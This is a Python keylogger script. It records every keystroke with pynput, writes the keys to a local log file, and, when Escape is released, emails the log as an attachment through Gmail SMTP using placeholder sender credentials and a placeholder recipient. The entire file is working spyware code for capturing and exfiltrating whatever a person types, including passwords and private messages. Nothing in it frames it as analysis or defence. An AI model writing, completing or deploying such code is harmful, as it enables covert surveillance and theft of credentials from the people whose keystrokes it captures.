import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener
import os

keys_information = "key.log.txt"
file_path = "C:\\Users\\91790\\PycharmProjects\\Keylogger\\venv" #Directory path where the log file is stored.
extend = "\\" 
count = 0
keys = []

email_address = "sender@gmail.com"  # Replace with your email address
email_password = "password"        # Replace with your email password
to_address = "reciever@gmail.com"  # Replace with the recipient's email address

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", '')
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def send_email():
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = to_address
    msg['Subject'] = 'Keylogger Report'

    body = 'Attached is the keylogger report.'
    msg.attach(MIMEText(body, 'plain'))

    filename = file_path + extend + keys_information
    attachment = open(filename, "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(filename)}')

    msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_address, email_password)
        text = msg.as_string()
        server.sendmail(email_address, to_address, text)
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(f"Failed to send email: {e}")
    finally:
        attachment.close()

def on_release(key):
    if key == Key.esc:
        send_email()
        return False

with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()
